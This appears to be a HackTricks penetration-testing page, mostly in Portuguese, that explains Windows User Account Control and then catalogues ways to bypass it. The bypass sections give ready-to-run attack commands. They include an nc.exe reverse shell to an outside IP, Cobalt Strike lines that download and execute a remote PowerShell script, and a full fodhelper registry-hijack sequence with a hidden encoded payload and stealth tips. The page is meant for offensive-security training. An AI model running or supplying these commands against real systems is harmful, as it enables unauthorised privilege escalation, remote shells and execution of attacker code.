# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) é um recurso que habilita uma **solicitação de consentimento para atividades elevadas**. Aplicações têm diferentes níveis de `integrity`, e um programa com um **nível alto** pode executar tarefas que **podem potencialmente comprometer o sistema**. Quando o UAC está habilitado, aplicações e tarefas sempre **executam sob o contexto de segurança de uma conta não-administradora** a menos que um administrador autorize explicitamente que essas aplicações/tarefas tenham acesso de nível administrador ao sistema para serem executadas. É um recurso de conveniência que protege administradores de alterações não intencionais, mas não é considerado uma fronteira de segurança.

For more info about integrity levels:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Quando o UAC está em vigor, um usuário administrador recebe 2 tokens: um token de usuário padrão, para realizar ações regulares em nível normal, e outro com os privilégios de administrador.

Esta [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) discute como o UAC funciona em grande detalhe e inclui o processo de logon, experiência do usuário e arquitetura do UAC. Administradores podem usar políticas de segurança para configurar como o UAC funciona especificamente para sua organização no nível local (usando secpol.msc), ou configurado e distribuído via Group Policy Objects (GPO) em um ambiente de domínio Active Directory. As várias configurações são discutidas em detalhe [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Existem 10 configurações de Group Policy que podem ser definidas para o UAC. A tabela a seguir fornece mais detalhes:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Disabled                                                     |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Disabled                                                     |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Prompt for consent for non-Windows binaries                  |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Prompt for credentials on the secure desktop                 |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Enabled (default for home) Disabled (default for enterprise) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Disabled                                                     |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Enabled                                                      |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Enabled                                                      |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Enabled                                                      |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Enabled                                                      |

### Teoria de Bypass do UAC

Alguns programas são **autoelevated automatically** se o **usuário pertence** ao **grupo de administradores**. Esses binários possuem dentro de seus _**Manifests**_ a opção _**autoElevate**_ com valor _**True**_. O binário também precisa ser **assinado pela Microsoft**.

Muitos processos auto-elevados expõem **funcionalidade via COM objects ou RPC servers**, que podem ser invocados a partir de processos rodando com integridade média (privilégios de usuário regular). Note que COM (Component Object Model) e RPC (Remote Procedure Call) são métodos que programas do Windows usam para se comunicar e executar funções entre processos diferentes. Por exemplo, o **`IFileOperation COM object`** é projetado para lidar com operações de arquivo (copiar, deletar, mover) e pode automaticamente elevar privilégios sem um prompt.

Note que algumas verificações podem ser realizadas, como checar se o processo foi executado a partir do **diretório System32**, o que pode ser contornado por exemplo **injetando em explorer.exe** ou outro executável localizado em System32.

Outra forma de contornar essas checagens é **modificar o PEB**. Todo processo no Windows possui um Process Environment Block (PEB), que inclui dados importantes sobre o processo, como seu caminho executável. Ao modificar o PEB, atacantes podem falsificar (spoof) a localização do seu próprio processo malicioso, fazendo com que pareça estar rodando a partir de um diretório confiável (como system32). Essa informação falsificada engana o COM object para auto-elevar privilégios sem solicitar ao usuário.

Então, para **bypassar** o **UAC** (elevar do nível de integridade **médio** para **alto**), alguns atacantes usam esse tipo de binários para **executar código arbitrário**, porque ele será executado por um processo de nível de integridade **alto**.

Você pode **verificar** o _**Manifest**_ de um binário usando a ferramenta _**sigcheck.exe**_ da Sysinternals. (`sigcheck.exe -m <file>`) E você pode **ver** o **nível de integridade** dos processos usando o _Process Explorer_ ou _Process Monitor_ (da Sysinternals).

### Verificar UAC

Para confirmar se o UAC está habilitado faça:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Se for **`1`** então o UAC está **ativado**, se for **`0`** ou não existir, então o UAC está **inativo**.

Depois, verifique **qual nível** está configurado:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- Se **`0`**, então o UAC não exibirá prompt (como **desativado**)
- Se **`1`**, o administrador é **solicitado por nome de usuário e senha** para executar o binário com privilégios elevados (no Secure Desktop)
- Se **`2`** (**Sempre notificar-me**) o UAC sempre pedirá confirmação ao administrador quando ele tentar executar algo com privilégios elevados (no Secure Desktop)
- Se **`3`** igual a `1` mas não é necessário no Secure Desktop
- Se **`4`** igual a `2` mas não é necessário no Secure Desktop
- Se **`5`** (**padrão**) ele solicitará ao administrador para confirmar a execução de binários não Windows com privilégios elevados

Então, você deve verificar o valor de **`LocalAccountTokenFilterPolicy`**\
Se o valor for **`0`**, então somente o usuário **RID 500** (**built-in Administrator**) é capaz de executar **tarefas administrativas sem UAC**, e se for `1`, **todas as contas dentro do grupo "Administrators"** podem fazê-lo.

E, finalmente, verifique o valor da chave **`FilterAdministratorToken`**\
Se **`0`** (padrão), a conta **built-in Administrator** pode executar tarefas de administração remota e se **`1`** a conta built-in Administrator **não pode** executar tarefas de administração remota, a menos que `LocalAccountTokenFilterPolicy` esteja definido como `1`.

#### Resumo

- Se `EnableLUA=0` ou **não existe**, **sem UAC para ninguém**
- Se `EnableLua=1` e **`LocalAccountTokenFilterPolicy=1`**, **sem UAC para ninguém**
- Se `EnableLua=1` e **`LocalAccountTokenFilterPolicy=0` e `FilterAdministratorToken=0`**, **sem UAC para RID 500 (Built-in Administrator)**
- Se `EnableLua=1` e **`LocalAccountTokenFilterPolicy=0` e `FilterAdministratorToken=1`**, **UAC para todos**

Todas essas informações podem ser obtidas usando o módulo **metasploit**: `post/windows/gather/win_privs`

Você também pode verificar os grupos do seu usuário e obter o nível de integridade:
```
net user %username%
whoami /groups | findstr Level
```
## UAC bypass

> [!TIP]
> Observe que, se você tiver acesso gráfico à vítima, o UAC bypass é direto: você pode simplesmente clicar em "Yes" quando o prompt do UAC aparecer

O UAC bypass é necessário na seguinte situação: **o UAC está ativado, seu processo está sendo executado em um medium integrity context, e seu usuário pertence ao administrators group**.

É importante mencionar que é **muito mais difícil contornar o UAC se ele estiver no nível de segurança mais alto (Always) do que em qualquer um dos outros níveis (Default).**

### UAC desativado

Se o UAC já estiver desativado (`ConsentPromptBehaviorAdmin` é **`0`**) você pode **executar um reverse shell com admin privileges** (high integrity level) usando algo como:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Muito** Básico UAC "bypass" (acesso completo ao sistema de arquivos)

Se você tem um shell com um usuário que está no grupo Administrators, você pode **montar o compartilhamento C$** via SMB (sistema de arquivos) local em um novo disco e terá **acesso a tudo dentro do sistema de arquivos** (até a pasta home do Administrator).

> [!WARNING]
> **Parece que esse truque não está funcionando mais**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass com cobalt strike

As técnicas do Cobalt Strike só funcionarão se o UAC não estiver configurado no nível máximo de segurança
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** e **Metasploit** também têm vários módulos para **bypass** do **UAC**.

### KRBUACBypass

Documentação e ferramenta em [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) que é uma **compilação** de vários UAC bypass exploits. Observe que você precisará **compilar UACME usando visual studio ou msbuild**. A compilação criará vários executáveis (como `Source\Akagi\outout\x64\Debug\Akagi.exe`), você precisará saber **qual deles você precisa.**\
Você deve **ter cuidado** porque alguns bypasses irão **causar prompts em outros programas** que irão **alertar** o **usuário** de que algo está acontecendo.

UACME tem a **build version from which each technique started working**. Você pode procurar por uma técnica que afete suas versões:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Além disso, usando [esta](https://en.wikipedia.org/wiki/Windows_10_version_history) página você obtém o release do Windows `1607` a partir das versões de build.

### UAC Bypass – fodhelper.exe (Registry hijack)

O binário confiável `fodhelper.exe` é elevado automaticamente em versões modernas do Windows. Quando lançado, ele consulta o caminho do Registro por usuário abaixo sem validar o verbo `DelegateExecute`. Plantar um comando ali permite que um processo Medium Integrity (usuário é membro do grupo Administrators) gere um processo High Integrity sem um UAC prompt.

Caminho do Registro consultado pelo fodhelper:
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
Passos do PowerShell (defina seu payload, depois acione):
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
Notas:
- Funciona quando o usuário atual é membro dos Administrators e o nível do UAC está em padrão/leniente (não em Always Notify com restrições extras).
- Use o caminho `sysnative` para iniciar um PowerShell 64-bit a partir de um processo 32-bit em Windows 64-bit.
- A payload pode ser qualquer comando (PowerShell, cmd, ou um caminho de EXE). Evite UIs que exibam prompts para manter stealth.

#### More UAC bypass

**Todas** as técnicas usadas aqui para contornar a AUC **exigem** um **shell interativo completo** com a vítima (um shell comum nc.exe não é suficiente).

Você pode conseguir isso usando uma sessão **meterpreter**. Migre para um **process** que tenha o valor **Session** igual a **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ deve funcionar)

### UAC Bypass with GUI

Se você tiver acesso a uma **GUI, você pode simplesmente aceitar o prompt do UAC** quando ele aparecer; você realmente não precisa de um bypass. Portanto, obter acesso a uma GUI permitirá contornar o UAC.

Além disso, se você obtiver uma sessão GUI que alguém estava usando (potencialmente via RDP), existem **algumas ferramentas que estarão rodando como administrador** das quais você poderia, por exemplo, **executar** um **cmd** **como admin** diretamente sem ser solicitado novamente pelo UAC, como [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Isso pode ser um pouco mais **stealthy**.

### Noisy brute-force UAC bypass

Se você não se importa em ser barulhento, você sempre pode **executar algo como** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) que **pede para elevar permissões até que o usuário aceite**.

### Your own bypass - Basic UAC bypass methodology

Se você olhar o **UACME**, vai notar que **a maioria dos bypasses de UAC explora uma vulnerabilidade de Dll Hijacking** (principalmente escrevendo a dll maliciosa em _C:\Windows\System32_). [Leia isto para aprender como encontrar uma vulnerabilidade de Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Encontre um binário que **autoelevate** (verifique que ao ser executado ele roda em um nível de integridade alto).
2. Com o procmon, encontre eventos "**NAME NOT FOUND**" que possam ser vulneráveis a **DLL Hijacking**.
3. Você provavelmente precisará **escrever** a DLL dentro de alguns caminhos protegidos (como C:\Windows\System32) onde você não tem permissões de escrita. Você pode contornar isso usando:
1. **wusa.exe**: Windows 7,8 e 8.1. Permite extrair o conteúdo de um arquivo CAB dentro de caminhos protegidos (porque essa ferramenta é executada em um nível de integridade alto).
2. **IFileOperation**: Windows 10.
4. Prepare um **script** para copiar sua DLL para dentro do caminho protegido e executar o binário vulnerável e autoelevated.

### Another UAC bypass technique

Consiste em observar se um **autoElevated binary** tenta **ler** do **registry** o **name/path** de um **binary** ou **command** a ser **executed** (isso é mais interessante se o binário procura essa informação dentro de **HKCU**).

## Referências
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)

{{#include ../../banners/hacktricks-training.md}}
